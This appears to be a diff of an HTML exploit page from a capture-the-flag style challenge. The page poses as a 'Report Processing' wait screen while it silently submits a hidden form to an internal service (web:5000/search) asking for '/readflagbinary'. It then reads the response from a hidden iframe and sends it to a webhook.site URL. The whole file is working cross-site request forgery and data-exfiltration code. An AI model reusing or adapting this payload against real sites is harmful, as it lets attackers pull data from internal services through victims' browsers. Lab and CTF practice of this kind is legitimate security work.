@@ -1,7 +1,43 @@
 <!DOCTYPE html>
-<html><head></head><body onload="doIt()">
-<script>
-function doIt() {
-    new Image().src = 'https://webhook.site/227b0e75-41a9-46f7-b5f1-9bc2d27c327d';
-}
-</script></body></html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Report Processing</title>
+</head>
+<body>
+    <h1>Processing your report...</h1>
+    <p>Please wait...</p>
+    
+    <!-- Hidden form to POST to /search -->
+    <form id="searchForm" method="POST" action="http://web:5000/search" target="responseFrame" style="display:none;">
+        <input type="hidden" name="search" value="/readflagbinary">
+    </form>
+    
+    <!-- Hidden iframe to capture response -->
+    <iframe id="responseFrame" name="responseFrame" style="display:none;"></iframe>
+    
+    <script>
+        // Submit the form
+        document.getElementById('searchForm').submit();
+        
+        // Wait a moment for response, then capture and exfiltrate
+        setTimeout(function() {
+            try {
+                // Try to read iframe content
+                let iframe = document.getElementById('responseFrame');
+                let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                let content = iframeDoc.body.innerText || iframeDoc.documentElement.innerText || '';
+                
+                // Exfiltrate to webhook
+                let webhookUrl = 'https://webhook.site/227b0e75-41a9-46f7-b5f1-9bc2d27c327d?data=' + encodeURIComponent(content);
+                fetch(webhookUrl).catch(e => console.log(e));
+                
+            } catch(e) {
+                // If same-origin fails, just send error
+                let webhookUrl = 'https://webhook.site/227b0e75-41a9-46f7-b5f1-9bc2d27c327d?error=' + encodeURIComponent(e.message);
+                fetch(webhookUrl).catch(e => console.log(e));
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
